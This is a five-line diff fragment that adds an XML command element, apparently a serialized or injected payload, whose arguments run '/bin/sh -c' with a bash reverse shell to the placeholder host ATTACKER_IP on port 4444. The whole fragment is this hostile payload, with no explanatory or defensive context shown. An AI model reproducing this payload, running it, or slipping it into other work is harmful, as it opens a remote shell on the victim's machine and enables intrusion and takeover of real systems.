@@ -1,0 +1,5 @@
+<command>
+<string>/bin/sh</string>
+<string>-c</string>
+<string>bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</string>
+</command>
